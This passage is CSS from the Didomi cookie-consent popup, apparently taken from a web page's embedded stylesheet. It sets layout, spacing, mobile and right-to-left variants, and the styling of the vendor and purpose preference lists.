      #didomi-host .didomi-popup-notice .didomi-popup-notice-logo {
        width: 200px;
        margin-bottom: 30px;
      }
      #didomi-host .didomi-popup-notice .didomi-popup-notice-text,
      #didomi-host .didomi-popup-notice .didomi-popup-notice-subtext {
        max-width: 600px;
        width: 100%;
        flex: 0 auto;
        text-align: left;
      }
      [dir="rtl"] #didomi-host .didomi-popup-notice .didomi-popup-notice-text,
      [dir="rtl"] #didomi-host .didomi-popup-notice .didomi-popup-notice-subtext {
        text-align: right;
      }
      #didomi-host .didomi-popup-notice .didomi-notice-view-partners-link {
        display: block;
        text-align: center;
        margin-top: 20px;
      }
      #didomi-host .didomi-popup-notice .didomi-notice-view-partners-link-in-text {
        text-decoration: underline;
      }
      #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons {
        margin-top: 30px;
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: row;
        flex-direction: row;
        justify-content: center;
        align-items: center;
      }
      #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-components-button {
        padding: 2px 25px;
      }
      #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-components-button:hover {
        opacity: 0.7;
      }
      #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons a {
        text-decoration: underline;
      }
      #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-button {
        min-width: 200px;
        margin-right: 10px;
      }
      [dir="rtl"] #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-button {
        margin-right: 0px;
      }
      #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-button:last-child {
        margin-right: 0px;
      }
      [dir="rtl"] #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-button:last-child {
        margin-right: 10px;
      }
      [dir="rtl"] #didomi-host .didomi-popup-notice .didomi-popup-notice-buttons .didomi-button:not(:last-child):not(:first-child) {
        margin-right: 10px;
      }
      #didomi-host .didomi-popup-notice .didomi-popup-notice-subtext {
        margin-top: 30px;
      }
      #didomi-host .didomi-popup-notice .didomi-popup-close {
        position: absolute;
        right: 30px;
        top: 30px;
      }
      #didomi-host .didomi-popup-notice-optin-type {
        max-width: 730px;
      }
      #didomi-host .didomi-popup-notice-optin-type .didomi-popup-notice-buttons {
        align-items: initial;
      }
      #didomi-host .didomi-popup-notice-optin-type .didomi-popup-notice-buttons .didomi-components-button {
        padding: 8px 16px !important;
        line-height: 140%;
        height: auto;
      }
      #didomi-host .didomi-popup-notice-optin-type .didomi-popup-notice-logo-container,
      #didomi-host .didomi-popup-notice-optin-type .didomi-popup-notice-text-container {
        clear: both;
      }
      #didomi-host .didomi-popup-notice-optin-type .didomi-continue-without-agreeing {
        float: right;
        margin-top: -10px;
        margin-bottom: 40px;
      }
      [dir="rtl"] #didomi-host .didomi-popup-notice-optin-type .didomi-continue-without-agreeing {
        float: left;
      }
      #didomi-host .didomi-mobile #notice-vendors-number-section {
        align-items: end;
        flex-direction: column;
      }
      #didomi-host .didomi-mobile #notice-vendors-number-section .didomi-vendors-count-view-vendors-list-link {
        border-color: #05687b;
        color: #05687b;
      }
      #didomi-host .didomi-mobile #didomi-popup .didomi-popup-notice {
        padding: 30px;
        font-size: 12px;
        line-height: 160%;
      }
      #didomi-host .didomi-mobile #didomi-popup .didomi-popup-notice h1 {
        margin-bottom: 35px;
      }
      #didomi-host .didomi-mobile #didomi-popup .didomi-popup-notice p {
        text-align: justify;
      }
      #didomi-host .didomi-mobile .didomi-popup-with-x-button {
        padding-top: 0;
      }
      #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height {
        max-height: -webkit-fill-available;
      }
      #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view {
        max-height: -webkit-fill-available;
      }
      #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view > *:first-child {
        padding-top: 30px;
      }
      #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-logo-container .didomi-popup-notice-logo {
        margin-bottom: 30px;
      }
      #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container {
        padding: 0px 30px;
      }
      #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container > *:first-child {
        margin-top: 20px;
      }
      #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container > *:last-child {
        margin-bottom: 15px;
      }
      #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container ~ .didomi-popup-notice-logo-container {
        padding: 0px 30px;
      }
      #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons {
        padding: 30px 15px;
      }
      #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons button:first-child {
        margin-top: 0px !important;
      }
      #didomi-host .didomi-mobile .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-subtext {
        margin-bottom: 30px;
      }
      #didomi-host .didomi-mobile .didomi-popup-notice-optin-type .didomi-continue-without-agreeing {
        margin-top: 0px;
        margin-bottom: 30px;
      }
      #didomi-host .didomi-mobile .didomi-popup-notice-text p {
        margin: 0px;
        font-size: 12px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-popup-notice-buttons {
        -moz-flex-direction: column;
        flex-direction: column;
        margin-top: 15px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-popup-notice-buttons .didomi-components-button {
        margin: 10px 0 0 0 !important;
      }
      #didomi-host .didomi-screen-xsmall .didomi-popup-with-x-button {
        padding-top: 0;
      }
      #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view > *:first-child {
        padding-top: 15px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-logo-container .didomi-popup-notice-logo {
        margin-bottom: 15px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container {
        padding: 0px 15px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container > *:first-child {
        margin-top: 20px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container > *:last-child {
        margin-bottom: 15px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container ~ .didomi-popup-notice-logo-container {
        padding: 0px 15px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons {
        padding: 15px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons button:first-child {
        margin-top: 0px !important;
      }
      #didomi-host .didomi-screen-xsmall .didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-subtext {
        margin-bottom: 15px;
      }
      #didomi-host #didomi-notice.didomi-custom-notice-html {
        position: fixed;
        z-index: 2147483640;
      }
      #didomi-host #didomi-notice.didomi-custom-notice-html.shape-box {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: column;
        flex-direction: column;
        -webkit-flex-pack: justify;
        -moz-justify-content: space-between;
        justify-content: space-between;
      }
      #didomi-host #didomi-notice.didomi-custom-notice-html.shape-banner {
        left: 0;
        right: 0;
      }
      #didomi-host #didomi-notice.didomi-custom-notice-html.top {
        top: 0;
      }
      #didomi-host #didomi-notice.didomi-custom-notice-html.bottom {
        bottom: 0;
      }
      #didomi-host #didomi-notice.didomi-custom-notice-html.left {
        left: 0;
      }
      #didomi-host #didomi-notice.didomi-custom-notice-html.right {
        right: 0;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-custom-notice-html {
        left: 0;
        right: 0;
      }
      #didomi-host .didomi-consent-popup-body {
        padding: 30px 20px;
      }
      #didomi-host .didomi-consent-popup-body .didomi-consent-popup-body__title {
        font-size: 12px;
        color: #526e7a;
        text-transform: uppercase;
        font-weight: bold;
        margin-bottom: 8px;
        display: block;
        font-weight: bold;
        font-family: "Arial";
      }
      #didomi-host .didomi-consent-popup-body .didomi-consent-popup-body__subtext {
        margin-bottom: 22px;
      }
      #didomi-host .didomi-consent-popup-body .didomi-consent-popup-body__explanation a {
        font-weight: bold;
        text-decoration: underline;
      }
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height {
        box-sizing: border-box;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height.didomi-max-height-reached .didomi-exterior-border {
        border-radius: 0px;
      }
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height.didomi-max-height-reached .didomi-popup-container {
        border-radius: 0px;
      }
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border {
        box-sizing: border-box;
        margin: 0 auto;
        z-index: 2147483641;
        padding: 0 !important;
        max-height: 100%;
        display: flex;
      }
      @media all and (-ms-high-contrast: none) {
        #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border *::-ms-backdrop,
        #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-popup-container {
          display: block !important;
        }
        #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border *::-ms-backdrop,
        #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences {
          display: block !important;
        }
      }
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-popup-container {
        flex: 1 0 auto;
        box-sizing: border-box;
        margin: 0 auto;
        padding: 0 !important;
        display: flex;
      }
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences {
        padding: 0;
        display: flex;
      }
      @media all and (-ms-high-contrast: none) {
        #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences *::-ms-backdrop,
        #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view {
          height: auto !important;
          overflow-y: auto;
        }
      }
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view {
        max-height: 100vh;
        height: 100%;
        height: -moz-fit-content;
        height: fit-content;
        height: -webkit-fit-content;
        width: 100%;
        padding: 0;
        flex: 1;
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: column;
        flex-direction: column;
        -webkit-flex-pack: start;
        -moz-justify-content: flex-start;
        justify-content: flex-start;
      }
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-body {
        overflow-y: auto;
        padding: 10px 20px 0px 20px;
      }
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-body > *:last-child {
        margin-bottom: 20px;
      }
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-header {
        box-sizing: border-box;
        flex: 1 0 auto;
        z-index: 2147483640;
        padding: 15px 20px;
      }
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-footer {
        box-sizing: border-box;
        flex: 1 0 auto;
        z-index: 2147483640;
        padding: 10px 20px;
      }
      #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-footer .didomi-logo-icon {
        margin-left: 0px;
      }
      @media all and (-ms-high-contrast: none) {
        #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view *::-ms-backdrop,
        #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-header {
          flex: 1 0 0;
        }
        #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view *::-ms-backdrop,
        #didomi-host .didomi-consent-popup__backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-footer {
          flex: 1 0 0;
        }
      }
      #didomi-host .didomi-mobile .didomi-popup-backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view {
        max-height: -webkit-fill-available;
      }
      #didomi-host .didomi-mobile .didomi-popup-backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-body {
        padding: 15px 15px 0px 15px;
      }
      #didomi-host .didomi-mobile .didomi-popup-backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-body > *:last-child {
        margin-bottom: 15px;
      }
      #didomi-host .didomi-mobile .didomi-popup-backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-header {
        padding: 10px 15px;
        box-shadow: 0px 3px 10px -2px rgba(0, 0, 0, 0.1);
      }
      #didomi-host .didomi-mobile .didomi-popup-backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-footer {
        padding: 10px 15px;
        box-shadow: 0 -3px 10px -2px rgba(0, 0, 0, 0.1);
      }
      #didomi-host .didomi-mobile .didomi-popup-backdrop.didomi-support-full-height .didomi-exterior-border .didomi-consent-popup-preferences .didomi-popup-view .didomi-popup-footer .didomi-consent-popup-actions {
        padding: 0px;
      }
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-data-processing__buttons {
        -webkit-flex-shrink: 0;
        -webkit-box-flex: 0;
        flex-shrink: 0;
        margin-left: 15px;
      }
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-data-processing {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: row;
        flex-direction: row;
        -webkit-flex-pack: justify;
        -moz-justify-content: space-between;
        justify-content: space-between;
        -moz-align-items: center;
        align-items: center;
        margin-bottom: 8px;
      }
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-vendor,
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-purpose {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: row;
        flex-direction: row;
        -webkit-flex-pack: justify;
        -moz-justify-content: space-between;
        justify-content: space-between;
        -moz-align-items: center;
        align-items: center;
        flex-wrap: wrap;
        overflow: auto;
        margin-bottom: 8px;
      }
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-vendor .didomi-consent-popup-vendor__buttons,
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-vendor .didomi-consent-popup-purpose__buttons,
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-purpose .didomi-consent-popup-vendor__buttons,
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-purpose .didomi-consent-popup-purpose__buttons {
        -webkit-flex-shrink: 0;
        -webkit-box-flex: 0;
        flex-shrink: 0;
        margin-left: 15px;
      }
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-vendor .didomi-consent-popup-vendor__start_aligned_buttons,
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-purpose .didomi-consent-popup-vendor__start_aligned_buttons {
        align-self: start;
      }
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-vendor .didomi-consent-popup-vendor__right_aligned_buttons,
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-purpose .didomi-consent-popup-vendor__right_aligned_buttons {
        float: right;
        margin-top: -2px;
      }
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-partner {
        display: inline-block;
        margin-right: 15px;
        margin-bottom: 5px;
      }
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-partner a {
        border-bottom: 1px dashed #000;
      }
      #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-vendor {
        -moz-flex-direction: column;
        flex-direction: column;
        -moz-align-items: flex-start;
        align-items: flex-start;
        margin-bottom: 8px;
      }
      #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-vendor .didomi-consent-popup-vendor__buttons,
      #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-vendor .didomi-consent-popup-purpose__buttons {
        -webkit-flex-shrink: 0;
        -webkit-box-flex: 0;
        flex-shrink: 0;
        margin-left: 0px;
        margin-top: 10px;
      }
      #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-data-processing {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: column;
        flex-direction: column;
        -webkit-flex-pack: start;
        -moz-justify-content: flex-start;
        justify-content: flex-start;
        -moz-align-items: flex-start;
        align-items: flex-start;
      }
      #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-data-processing .didomi-consent-popup-data-processing__purpose,
      #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-data-processing .didomi-consent-popup-category__name {
        margin-bottom: 6px;
      }
      #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-data-processing .didomi-consent-popup-data-processing__description,
      #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-preferences .didomi-consent-popup-data-processing .didomi-consent-popup-category__description {
        font-size: 12px;
      }
      #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-category__description {
        margin-bottom: 20px;
        font-size: 12px;
      }
      #didomi-host .didomi-mobile #didomi-consent-popup .didomi-consent-popup-data-processing__essential_purpose {
        flex: 0;
      }
      #didomi-host .didomi-mobile .didomi-consent-popup-vendor__right_aligned_buttons {
        display: flex;
        float: none !important;
        margin-top: 0px !important;
      }
      #didomi-host .didomi-consent-popup-information .didomi-consent-popup-body {
        max-height: 300px;
        overflow: auto;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-consent-popup-body_vendors-list .didomi-vendors-details-title {
        font-weight: 700;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-consent-popup-body_vendors-list ul {
        margin: 0;
        padding: 16px 12px;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-consent-popup-body_vendors-list ul li {
        margin-bottom: 10px;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-consent-popup-body_vendors-list ul li:last-child {
        margin-bottom: 0;
      }
      #didomi-host .didomi-retention-time {
        color: #333;
        display: inline-block;
        border-radius: 4px;
        background: #e2f5f9;
        padding: 0 8px;
        text-align: center;
        margin-left: 8px;
        font-size: 10px;
      }
      #didomi-host .didomi-retention-time span:first-child {
        font-weight: 700;
      }
      #didomi-host .didomi-consent-popup-vendor__description {
        color: #333;
        padding-top: 3px;
        border-left: 1px solid;
        padding-left: 10px;
        border-color: #e6e2d7;
        font-size: 14px;
      }
      #didomi-host .didomi-consent-popup-vendor__description > div {
        margin-bottom: 8px;
      }
      #didomi-host .didomi-consent-popup-vendor__description > div:last-child {
        margin-bottom: 0;
      }
      #didomi-host .didomi-consent-popup-vendor__description .didomi-components-accordion-label-container {
        font-weight: 700;
        text-decoration: underline;
        line-height: 24px;
        word-wrap: break-word;
        padding-bottom: 0;
      }
      #didomi-host .didomi-consent-popup-vendor__description .didomi-components-accordion-label-container .trigger-icon {
        margin-right: 4px;
      }
      #didomi-host .didomi-consent-popup-vendor__description .didomi-content {
        margin: 0;
        padding: 16px 12px;
      }
      #didomi-host .didomi-consent-popup-vendor__description .didomi-content p:first-child {
        margin-top: 0;
      }
      #didomi-host .didomi-consent-popup-vendor__description .didomi-content ul {
        margin: 0;
        padding: 0;
      }
      #didomi-host .didomi-consent-popup-vendor__description .didomi-content ul li {
        margin-bottom: 10px;
      }
      #didomi-host .didomi-consent-popup-vendor__description .didomi-content ul li:last-child {
        margin-bottom: 0;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-consent-popup-body_vendors-list {
        height: 280px;
        overflow: auto;
        border: 2px solid rgba(0, 0, 0, 0.05);
        padding: 12px;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-consent-popup-body {
        padding: 20px 20px;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-consent-popup-container-click-all {
        font-weight: bold;
        background: rgba(0, 0, 0, 0.05);
        padding: 8px 12px;
        margin: 0px !important;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-popup-title {
        cursor: pointer;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-popup-title:hover {
        opacity: 0.7;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-user-information-container {
        word-break: break-all;
        border: 2px solid rgba(0, 0, 0, 0.05);
        padding: 12px;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-user-information-trigger {
        font-size: 12px;
        color: #666;
        font-weight: 700;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-user-information-trigger > .trigger-icon {
        font-size: 12px !important;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-disclaimer,
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-iab-disclaimer {
        color: #333;
        margin-bottom: 10px;
        margin-top: 16px;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-disclaimer p,
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-iab-disclaimer p {
        margin: 0px;
      }
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-disclaimer a,
      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-vendors-iab-disclaimer a {
        color: #526e7a;
      }
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-data-processing .didomi-consent-popup-data-processing-illustrations {
        background: #f1f0f1;
        border: 1px #ddd solid;
        padding: 10px;
        font-size: 10px;
        line-height: 16px;
      }
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-data-processing .didomi-consent-popup-data-processing-illustrations .didomi-consent-popup-data-processing-illustration {
        display: block;
        margin: 0;
        padding: 10px 0;
        border-bottom: 1px solid #ddd;
      }
      #didomi-host .didomi-consent-popup-preferences .didomi-consent-popup-data-processing .didomi-consent-popup-data-processing-illustrations .didomi-consent-popup-data-processing-illustration:last-child {
        border-bottom: 0;
        padding-bottom: 0;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category {
        padding: 0px;
        margin: 12px 0 0;
        overflow-y: auto;
        scrollbar-width: none;
        -ms-overflow-style: none;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category::-webkit-scrollbar {
        display: none;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .label-click {
        font-weight: 700;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children {
        border-left: 1px solid #e7e2d6;
        padding: 0px 0px 5px 15px;
        margin-left: 15px;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__name {
        font-weight: bold;
        font-size: 15px;
        margin-bottom: 8px;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__description {
        font-size: 14px;
        font-weight: 300;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children {
        margin-top: 12px;
        padding-bottom: 0;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children .didomi-consent-popup-category {
        padding: 0;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children .didomi-consent-popup-category__name {
        font-size: 14px;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children .didomi-consent-popup-data-processing {
        border: none;
        padding: 0;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children .didomi-consent-popup-data-processing .didomi-consent-popup-data-processing__purpose {
        font-size: 14px;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children .didomi-consent-popup-data-processing__description {
        padding: 0px;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .didomi-consent-popup-category__children .didomi-consent-popup-preferences-purposes-features {
        font-size: 14px;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .vendors-count-label {
        min-height: 21px;
        border-radius: 4px;
        background: #f0f0f0;
        font-size: 10px;
        font-weight: 400;
        letter-spacing: 0em;
        margin-left: 5px;
        border: none;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .vendors-count-label:hover {
        background: #e2f5f9;
        cursor: pointer;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing,
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category {
        font-weight: bold;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing .label-button-section,
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .label-button-section {
        display: contents;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__description {
        font-size: 14px;
        color: #333;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__description p {
        margin: 10px 0;
        padding: 0;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__essential_purpose {
        display: flex;
        flex: 2.75;
        justify-content: center;
        margin: 5px 0px 5px 15px;
        text-transform: uppercase;
        font-size: 14px;
        line-height: 17px;
        color: #526e7a;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__essential_purpose_explanation {
        margin: 0px;
        padding: 0px;
        font-size: 14px;
        font-weight: bold;
        color: #526e7a;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__description_legal_icon {
        border-bottom: none;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__description_legal_icon svg {
        margin-top: -5px;
      }
      [dir="rtl"] #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__description_legal_icon::after {
        text-align: right;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__purpose_actions {
        display: flex;
        justify-content: flex-end;
        align-items: center;
        text-align: center;
        background-color: #fff;
        border-radius: 1px;
        margin-bottom: 15px;
        margin-top: 10px;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__purpose_actions .didomi-consent-popup-data-processing__purpose_actions_title {
        font-weight: bold;
        color: #333;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__purpose_actions .didomi-consent-popup-data-processing__purpose_action_buttons {
        float: right;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-categories-nested .didomi-consent-popup-data-processing {
        padding: 0px;
        margin: 12px 0 0;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-categories-nested .didomi-consent-popup-data-processing__purpose {
        font-size: 15px;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list {
        display: flex;
        justify-content: space-between;
        align-items: center;
        text-align: center;
        margin-bottom: 16px;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list .didomi-consent-popup-body__title {
        margin-bottom: 0;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list .didomi-consent-popup-view-vendors-list-link {
        cursor: pointer;
        box-shadow: 1px 1px 0 0 rgba(0, 0, 0, 0.1);
        background-color: #fff;
        border: 1px solid #eee;
        font-size: 12px;
        color: #757575;
        font-weight: 700;
        padding: 5px 15px;
        text-transform: initial;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list .didomi-consent-popup-view-vendors-list-link:hover {
        background-color: #eee;
        color: #585858;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list .didomi-consent-popup-view-vendors-list-link span {
        background: rgba(0, 0, 0, 0);
      }
